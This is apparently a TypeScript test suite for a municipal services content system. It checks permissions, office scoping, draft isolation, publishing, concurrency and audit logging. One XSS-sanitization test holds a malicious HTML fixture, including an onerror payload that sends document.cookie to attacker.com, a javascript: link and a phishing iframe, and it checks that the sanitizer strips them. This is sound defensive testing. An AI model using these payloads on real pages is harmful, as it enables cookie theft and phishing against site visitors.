// Standalone test mock for server-only marker package
const serverOnlyPath = require.resolve("server-only");
require.cache[serverOnlyPath] = {
  id: serverOnlyPath,
  filename: serverOnlyPath,
  loaded: true,
  exports: {},
  children: [],
  paths: [],
} as unknown as NodeJS.Module;

import type { SessionUser } from "../src/server/auth/session";

async function runServiceContentTestSuite() {
  console.log("=======================================================");
  console.log("SAN FELIPE LGU SERVICES CONTENT TEST SUITE (PHASE 13)");
  console.log("=======================================================\n");

  const { prisma } = await import("../src/server/db/client");
  const {
    getAdminServicesList,
    getAdminServicePage,
    updateServicePage,
    publishServicePage,
    unpublishServicePage,
    getPublishedServicePage,
    ensureCanonicalServicePages,
    ServiceError,
  } = await import("../src/server/services/service");
  const {
    CANONICAL_SERVICE_KEYS,
    CANONICAL_SERVICE_PAGES,
    isCanonicalServiceKey,
  } = await import("../src/config/services-canonical");
  const { sanitizeArticleHtml } = await import("../src/server/news/sanitize");
  const { validateServicePageForPublish } = await import(
    "../src/lib/validation/services"
  );
  const { AUDIT_ACTIONS } = await import("../src/server/audit/constants");
  const { PERMISSIONS } = await import("../src/server/authz/permissions");

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  ✓ PASS: ${testName}`);
      passed++;
    } else {
      console.error(`  ✗ FAIL: ${testName} ${detail ? `- ${detail}` : ""}`);
      failed++;
    }
  }

  try {
    // -------------------------------------------------------------------------
    // Setup Test Offices & Users
    // -------------------------------------------------------------------------
    const bploOffice = await prisma.office.upsert({
      where: { slug: "test-bplo-phase13" },
      update: {},
      create: {
        name: "Business Permits and Licensing Office",
        shortName: "BPLO",
        slug: "test-bplo-phase13",
        status: "ACTIVE",
      },
    });

    const mhoOffice = await prisma.office.upsert({
      where: { slug: "test-mho-phase13" },
      update: {},
      create: {
        name: "Municipal Health Office",
        shortName: "MHO",
        slug: "test-mho-phase13",
        status: "ACTIVE",
      },
    });

    const superAdminUser: SessionUser = {
      id: "test-superadmin-p13",
      email: "superadmin.p13@sanfelipe.gov.ph",
      name: "Phase 13 Super Admin",
      status: "ACTIVE",
      officeId: null,
      office: null,
      roleId: "role-superadmin-p13",
      isSystemScope: true,
      sessionId: "session-test-superadmin",
      role: {
        id: "role-superadmin-p13",
        name: "Super Administrator",
        slug: "super-admin",
        isSystemScope: true,
      },
      permissions: [
        PERMISSIONS.SERVICES_VIEW,
        PERMISSIONS.SERVICES_UPDATE,
        PERMISSIONS.SERVICES_PUBLISH,
      ],
    };

    const bploStaffUser: SessionUser = {
      id: "test-bplo-staff-p13",
      email: "bplo.staff.p13@sanfelipe.gov.ph",
      name: "BPLO Staff Member",
      status: "ACTIVE",
      officeId: bploOffice.id,
      office: {
        id: bploOffice.id,
        name: bploOffice.name,
        shortName: bploOffice.shortName,
        slug: bploOffice.slug,
      },
      roleId: "role-bplo-p13",
      isSystemScope: false,
      sessionId: "session-test-bplo-staff",
      role: {
        id: "role-bplo-p13",
        name: "Office Editor",
        slug: "office-editor",
        isSystemScope: false,
      },
      permissions: [
        PERMISSIONS.SERVICES_VIEW,
        PERMISSIONS.SERVICES_UPDATE,
      ],
    };

    const bploApproverUser: SessionUser = {
      id: "test-bplo-approver-p13",
      email: "bplo.approver.p13@sanfelipe.gov.ph",
      name: "BPLO Department Approver",
      status: "ACTIVE",
      officeId: bploOffice.id,
      office: {
        id: bploOffice.id,
        name: bploOffice.name,
        shortName: bploOffice.shortName,
        slug: bploOffice.slug,
      },
      roleId: "role-bplo-approver-p13",
      isSystemScope: false,
      sessionId: "session-test-bplo-approver",
      role: {
        id: "role-bplo-approver-p13",
        name: "Approver",
        slug: "approver",
        isSystemScope: false,
      },
      permissions: [
        PERMISSIONS.SERVICES_VIEW,
        PERMISSIONS.SERVICES_UPDATE,
        PERMISSIONS.SERVICES_PUBLISH,
      ],
    };

    const mhoStaffUser: SessionUser = {
      id: "test-mho-staff-p13",
      email: "mho.staff.p13@sanfelipe.gov.ph",
      name: "MHO Staff Member",
      status: "ACTIVE",
      officeId: mhoOffice.id,
      office: {
        id: mhoOffice.id,
        name: mhoOffice.name,
        shortName: mhoOffice.shortName,
        slug: mhoOffice.slug,
      },
      roleId: "role-mho-p13",
      isSystemScope: false,
      sessionId: "session-test-mho-staff",
      role: {
        id: "role-mho-p13",
        name: "Office Editor",
        slug: "office-editor",
        isSystemScope: false,
      },
      permissions: [
        PERMISSIONS.SERVICES_VIEW,
        PERMISSIONS.SERVICES_UPDATE,
      ],
    };

    const unauthorizedUser: SessionUser = {
      id: "test-unauth-p13",
      email: "unauth.p13@sanfelipe.gov.ph",
      name: "Unauthorized Staff",
      status: "ACTIVE",
      officeId: mhoOffice.id,
      office: {
        id: mhoOffice.id,
        name: mhoOffice.name,
        shortName: mhoOffice.shortName,
        slug: mhoOffice.slug,
      },
      roleId: "role-unauth-p13",
      isSystemScope: false,
      sessionId: "session-test-unauth",
      role: {
        id: "role-unauth-p13",
        name: "Read Only",
        slug: "read-only",
        isSystemScope: false,
      },
      permissions: [], // zero permissions
    };

    // Ensure database users exist for foreign key constraints
    const testUsers = [
      { id: superAdminUser.id, name: superAdminUser.name, email: superAdminUser.email, roleSlug: "super-admin", officeId: null },
      { id: bploStaffUser.id, name: bploStaffUser.name, email: bploStaffUser.email, roleSlug: "office-editor", officeId: bploOffice.id },
      { id: bploApproverUser.id, name: bploApproverUser.name, email: bploApproverUser.email, roleSlug: "approver", officeId: bploOffice.id },
      { id: mhoStaffUser.id, name: mhoStaffUser.name, email: mhoStaffUser.email, roleSlug: "office-editor", officeId: mhoOffice.id },
      { id: unauthorizedUser.id, name: unauthorizedUser.name, email: unauthorizedUser.email, roleSlug: "office-editor", officeId: mhoOffice.id },
    ];

    for (const tu of testUsers) {
      await prisma.user.upsert({
        where: { id: tu.id },
        update: {},
        create: {
          id: tu.id,
          name: tu.name,
          email: tu.email,
          passwordHash: "dummy-hash",
          status: "ACTIVE",
          role: { connect: { slug: tu.roleSlug } },
          ...(tu.officeId ? { office: { connect: { id: tu.officeId } } } : {}),
        },
      });
    }

    // Ensure baseline canonical pages exist
    await ensureCanonicalServicePages(superAdminUser.id);

    assert(
      Object.keys(CANONICAL_SERVICE_PAGES).length === 4,
      "Canonical service pages definitions contain exactly 4 entries"
    );
    assert(
      CANONICAL_SERVICE_KEYS.length === 4,
      "Canonical service keys contain exactly 4 entries"
    );

    // =========================================================================
    // 1. AUTHENTICATION & PERMISSION GUARDS
    // =========================================================================
    console.log("1. Authentication & Permission Enforcement");

    // services.view required for list
    try {
      await getAdminServicesList(unauthorizedUser);
      assert(false, "User without services.view should be denied from list");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 403, "Denies services list to user without services.view");
    }

    // services.view allowed user receives 4 canonical pages as pure read
    const listPages = await getAdminServicesList(superAdminUser);
    assert(listPages.length === 4, "getAdminServicesList returns 4 canonical pages as pure read without mutating state");

    // services.view required for single page
    try {
      await getAdminServicePage(unauthorizedUser, "citizens-charter");
      assert(false, "User without services.view should be denied from viewing service page");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 403, "Denies single service page to user without services.view");
    }

    // services.update required for editing
    try {
      await updateServicePage(unauthorizedUser, "citizens-charter", {
        title: "Unauthorized Edit Attempt",
        sections: [],
      });
      assert(false, "User without services.update should be denied from editing");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 403, "Denies editing to user without services.update");
    }

    // services.publish required for publishing
    try {
      await publishServicePage(bploStaffUser, "business-permits");
      assert(false, "User without services.publish should be denied from publishing");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 403, "Denies publishing to user without services.publish");
    }

    // =========================================================================
    // 2. CANONICAL SERVICE IDENTITIES & ROUTE IMMUTABILITY
    // =========================================================================
    console.log("\n2. Canonical Service Identities & Route Immutability");

    assert(CANONICAL_SERVICE_KEYS.length === 4, "Exactly 4 canonical service routes exist");
    assert(isCanonicalServiceKey("citizens-charter"), "citizens-charter is a valid canonical key");
    assert(isCanonicalServiceKey("business-permits"), "business-permits is a valid canonical key");
    assert(isCanonicalServiceKey("downloadable-forms"), "downloadable-forms is a valid canonical key");
    assert(isCanonicalServiceKey("job-opportunities"), "job-opportunities is a valid canonical key");
    assert(!isCanonicalServiceKey("arbitrary-new-route"), "Arbitrary service route is rejected");
    assert(!isCanonicalServiceKey("delete-service"), "Non-canonical route rejected");

    try {
      await getAdminServicePage(superAdminUser, "arbitrary-new-route");
      assert(false, "Non-canonical service page fetch should be rejected");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 404, "Rejects fetch for non-canonical route with 404");
    }

    try {
      await updateServicePage(superAdminUser, "fake-service-key", {
        title: "Forged Route",
        sections: [],
      });
      assert(false, "Non-canonical service page edit should be rejected");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 400, "Rejects edit for non-canonical route with 400");
    }

    // =========================================================================
    // 3. SYSTEM SCOPE & OFFICE ASSIGNMENT
    // =========================================================================
    console.log("\n3. System Scope & Office Assignment");

    // System admin can update any canonical service page and assign it to an office
    const assignedToBplo = await updateServicePage(superAdminUser, "business-permits", {
      title: "Business Permits & Licensing Guidelines",
      description: "Official commercial regulatory and permit standards of San Felipe.",
      officeId: bploOffice.id,
      sections: [
        {
          title: "General Licensing Guidelines",
          content: "<p>All commercial entities operating in San Felipe must maintain an active business permit.</p>",
          sortOrder: 0,
        },
      ],
    });

    assert(assignedToBplo?.officeId === bploOffice.id, "System admin successfully assigned business-permits to BPLO");

    // Invalid office rejected
    try {
      await updateServicePage(superAdminUser, "business-permits", {
        title: "Business Permits",
        officeId: "non-existent-office-id-9999",
        sections: [],
      });
      assert(false, "Invalid office ID should be rejected");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 400, "Rejects assignment of non-existent office ID");
    }

    // =========================================================================
    // 4. OFFICE SCOPE ENFORCEMENT & SECURITY BOUNDARY
    // =========================================================================
    console.log("\n4. Office Scope Enforcement & Security Boundary");

    // BPLO staff can edit business-permits (owned by BPLO)
    const bploUpdated = await updateServicePage(bploStaffUser, "business-permits", {
      title: "Business Permits & Licensing Guidelines (BPLO Edited)",
      description: "Updated by authorized BPLO personnel.",
      sections: [
        {
          title: "New Business Checklist",
          content: "<p>DTI/SEC registration, Barangay Clearance, and Sanitary Permit required.</p>",
          sortOrder: 0,
        },
        {
          title: "Processing Steps",
          content: "<ol><li>Submit documents</li><li>Assessment of taxes</li><li>Payment</li></ol>",
          sortOrder: 1,
        },
      ],
    });

    assert(
      bploUpdated?.sections.length === 2,
      "BPLO staff successfully updated own office's service page with 2 sections"
    );

    // MHO staff CANNOT edit business-permits (cross-office denial)
    try {
      await updateServicePage(mhoStaffUser, "business-permits", {
        title: "Malicious Cross-Office Overwrite",
        sections: [],
      });
      assert(false, "MHO staff should be denied from editing BPLO service page");
    } catch (e: unknown) {
      assert(e instanceof ServiceError && e.statusCode === 403, "Cross-office edit denied to unauthorized office staff");
    }

    // Office staff cannot edit unassigned/system-level service page
    const unassignedPage = await prisma.servicePage.findUnique({
      where: { serviceKey: "citizens-charter" },
    });
    if (unassignedPage && !unassignedPage.officeId) {
      try {
        await updateServicePage(mhoStaffUser, "citizens-charter", {
          title: "Attempted Edit on System Page",
          sections: [],
        });
        assert(false, "Office staff should be denied from editing unassigned system page");
      } catch (e: unknown) {
        assert(e instanceof ServiceError && e.statusCode === 403, "Office staff denied from modifying unassigned system-level page");
      }
    }

    // Office staff cannot forge officeId
    const forgedAttempt = await updateServicePage(bploStaffUser, "business-permits", {
      title: "Forged Office Attempt",
      officeId: mhoOffice.id, // Trying to switch officeId to MHO
      sections: bploUpdated?.sections.map((s) => ({
        id: s.id,
        title: s.title,
        content: s.content,
        sortOrder: s.sortOrder,
      })) || [],
    });
    assert(
      forgedAttempt?.officeId === bploOffice.id,
      "Office-scoped staff cannot forge or reassign officeId (input ignored for office users)"
    );

    // =========================================================================
    // 5. DRAFT ISOLATION & ZERO PUBLIC LEAKAGE
    // =========================================================================
    console.log("\n5. Draft Isolation & Zero Public Leakage");

    // Verify business-permits is currently DRAFT
    const currentDraft = await prisma.servicePage.findUnique({
      where: { serviceKey: "business-permits" },
    });
    assert(currentDraft?.status === "DRAFT", "business-permits is in DRAFT status");

    // Public query MUST return null for draft content
    const publicDraftQuery = await getPublishedServicePage("business-permits");
    assert(
      publicDraftQuery === null,
      "Public query strictly returns null for DRAFT service content (zero public leakage)"
    );

    // Public query for another draft page also returns null
    const publicCcQuery = await getPublishedServicePage("citizens-charter");
    assert(
      publicCcQuery === null || publicCcQuery.status === "PUBLISHED",
      "Public query returns null if citizens-charter is not yet published"
    );

    // =========================================================================
    // 6. PUBLISHING LIFECYCLE & VALIDATION
    // =========================================================================
    console.log("\n6. Publishing Lifecycle & Validation");

    // Cannot publish incomplete content
    const incompleteValidation = validateServicePageForPublish({
      title: "Short",
      sections: [],
    });
    assert(!incompleteValidation.valid, "Incomplete content rejected for publication");
    assert(
      incompleteValidation.errors.some((err) => err.includes("at least one")),
      "Validation catches missing content sections"
    );

    // BPLO approver publishes business-permits
    const published = await publishServicePage(bploApproverUser, "business-permits");
    assert(published.status === "PUBLISHED", "Service page transitioned to PUBLISHED status");
    assert(published.publishedAt !== null, "publishedAt timestamp is recorded upon publication");

    // Public query now returns published content
    const publicPublishedQuery = await getPublishedServicePage("business-permits");
    assert(publicPublishedQuery !== null, "Public query retrieves PUBLISHED service page");
    assert(
      publicPublishedQuery?.serviceKey === "business-permits",
      "Public query retrieves correct serviceKey"
    );
    assert(
      publicPublishedQuery?.sections.length === 2,
      "Public query includes published ordered sections"
    );
    assert(
      publicPublishedQuery?.office?.name === bploOffice.name,
      "Public query includes responsible office attribution"
    );

    // Unpublish strictly requires services.publish (update-only user rejected)
    const updateOnlyUser: SessionUser = {
      ...bploStaffUser,
      permissions: [PERMISSIONS.SERVICES_VIEW, PERMISSIONS.SERVICES_UPDATE],
    };
    try {
      await unpublishServicePage(updateOnlyUser, "business-permits");
      assert(false, "User without services.publish should be denied from unpublishing");
    } catch (e: unknown) {
      assert(
        e instanceof ServiceError && e.statusCode === 403,
        "Unpublishing denied to user without services.publish"
      );
    }

    // Unpublishing reverts back to DRAFT and removes from public view
    const unpublished = await unpublishServicePage(bploApproverUser, "business-permits");
    assert(unpublished.status === "DRAFT", "Service page successfully unpublished to DRAFT");

    const afterUnpublishPublic = await getPublishedServicePage("business-permits");
    assert(
      afterUnpublishPublic === null,
      "Public query immediately returns null after unpublishing"
    );

    // Re-publish for subsequent tests
    await publishServicePage(bploApproverUser, "business-permits");

    // =========================================================================
    // 7. CONTENT SECURITY & XSS SANITIZATION
    // =========================================================================
    console.log("\n7. Content Security & XSS Sanitization");

    const maliciousHtml = `
      <h3>Important Service Notice</h3>
      <p>Official instructions.</p>
      <script>alert('Malicious XSS Script Injected');</script>
      <img src="invalid-url" onerror="document.location='http://attacker.com/steal?c='+document.cookie" />
      <a href="javascript:void(alert(1))">Click to claim grant</a>
      <a href="https://sanfelipe.gov.ph" target="_blank">Official Municipal Portal</a>
      <iframe src="https://phishing-site.com"></iframe>
    `;

    const sanitizedHtml = sanitizeArticleHtml(maliciousHtml);

    assert(!sanitizedHtml.includes("<script>"), "Strips <script> tags");
    assert(!sanitizedHtml.includes("alert("), "Strips javascript alert payloads");
    assert(!sanitizedHtml.includes("onerror"), "Strips inline event handlers (onerror)");
    assert(!sanitizedHtml.includes("javascript:"), "Strips javascript: pseudo-protocol URIs");
    assert(!sanitizedHtml.includes("<iframe"), "Strips <iframe> tags");
    assert(sanitizedHtml.includes("<h3>Important Service Notice</h3>"), "Preserves valid semantic <h3> tags");
    assert(sanitizedHtml.includes("<p>Official instructions.</p>"), "Preserves valid <p> tags");
    assert(sanitizedHtml.includes('href="https://sanfelipe.gov.ph"'), "Preserves valid https:// links");
    assert(sanitizedHtml.includes('rel="noopener noreferrer"'), "Injects security rel attributes on external links");

    // =========================================================================
    // 8. OPTIMISTIC CONCURRENCY PROTECTION
    // =========================================================================
    console.log("\n8. Optimistic Concurrency Protection");

    const latestPage = await prisma.servicePage.findUnique({
      where: { serviceKey: "business-permits" },
    });
    assert(latestPage !== null, "Found latest service page for concurrency check");

    // Stale timestamp simulated
    const staleTimestamp = new Date(Date.now() - 120000).toISOString();

    try {
      await updateServicePage(superAdminUser, "business-permits", {
        title: "Stale Overwrite Attempt",
        sections: [],
        expectedUpdatedAt: staleTimestamp,
      });
      assert(false, "Stale update should have been rejected with conflict");
    } catch (e: unknown) {
      assert(
        e instanceof ServiceError && e.statusCode === 409,
        "Stale write rejected with 409 Conflict"
      );
    }

    // =========================================================================
    // 9. PROVENANCE & BASELINE EMPTY STATES
    // =========================================================================
    console.log("\n9. Provenance & Baseline Empty States");

    const uneditedCcPage = await prisma.servicePage.findUnique({
      where: { serviceKey: "citizens-charter" },
      include: { sections: true },
    });
    assert(
      uneditedCcPage?.status === "DRAFT",
      "Unpublished canonical page remains in DRAFT baseline status"
    );
    assert(
      uneditedCcPage?.sections.length === 0,
      "Baseline service page starts with zero sections (no unverified mock data invented)"
    );
    assert(
      uneditedCcPage?.description === null,
      "Baseline service page has null description (no unverified municipal content seeded)"
    );

    // =========================================================================
    // 10. ARCHITECTURAL PHASE BOUNDARIES
    // =========================================================================
    console.log("\n10. Architectural Phase Boundaries");

    // Phase 14: Ensure no downloadable document files table or columns were prematurely created
    const schemaFile = await import("fs").then((fs) =>
      fs.readFileSync("prisma/schema.prisma", "utf-8")
    );
    assert(
      !schemaFile.includes("model DownloadableFile"),
      "Phase 14 Boundary: DownloadableFile table not introduced in Phase 13"
    );
    assert(
      !schemaFile.includes("model JobPosting"),
      "Phase 15 Boundary: JobPosting table not introduced in Phase 13"
    );

    // =========================================================================
    // 11. AUDIT TRAIL VERIFICATION
    // =========================================================================
    console.log("\n11. Audit Trail Verification");

    const auditLogs = await prisma.auditLog.findMany({
      where: {
        action: {
          in: [
            AUDIT_ACTIONS.SERVICE_CONTENT_CREATED,
            AUDIT_ACTIONS.SERVICE_CONTENT_UPDATED,
            AUDIT_ACTIONS.SERVICE_CONTENT_PUBLISHED,
          ],
        },
      },
      orderBy: { createdAt: "desc" },
      take: 10,
    });

    const recordedActions = new Set(auditLogs.map((l) => l.action));
    assert(
      recordedActions.has(AUDIT_ACTIONS.SERVICE_CONTENT_UPDATED),
      "SERVICE_CONTENT_UPDATED audit action recorded in PostgreSQL"
    );
    assert(
      recordedActions.has(AUDIT_ACTIONS.SERVICE_CONTENT_PUBLISHED),
      "SERVICE_CONTENT_PUBLISHED audit action recorded in PostgreSQL"
    );
  } finally {
    // -------------------------------------------------------------------------
    // Cleanup test data & reset business-permits to draft
    // -------------------------------------------------------------------------
    await prisma.serviceSection.deleteMany({
      where: {
        servicePage: {
          serviceKey: "business-permits",
        },
      },
    });

    await prisma.servicePage.update({
      where: { serviceKey: "business-permits" },
      data: {
        title: "Business Permits",
        description: null,
        status: "DRAFT",
        officeId: null,
      },
    });

    await prisma.user.deleteMany({
      where: {
        id: {
          in: [
            "test-superadmin-p13",
            "test-bplo-staff-p13",
            "test-bplo-approver-p13",
            "test-mho-staff-p13",
            "test-unauth-p13",
          ],
        },
      },
    });

    await prisma.office.deleteMany({
      where: {
        slug: {
          in: ["test-bplo-phase13", "test-mho-phase13"],
        },
      },
    });

    await prisma.$disconnect();
  }

  // -------------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------------
  console.log("\n-------------------------------------------------------");
  console.log(`TOTAL TESTS: ${passed + failed}`);
  console.log(`PASSED:      ${passed}`);
  console.log(`FAILED:      ${failed}`);
  console.log("-------------------------------------------------------\n");

  if (failed > 0) {
    process.exit(1);
  }
}

runServiceContentTestSuite().catch((err) => {
  console.error("Test execution failed:", err);
  process.exit(1);
});
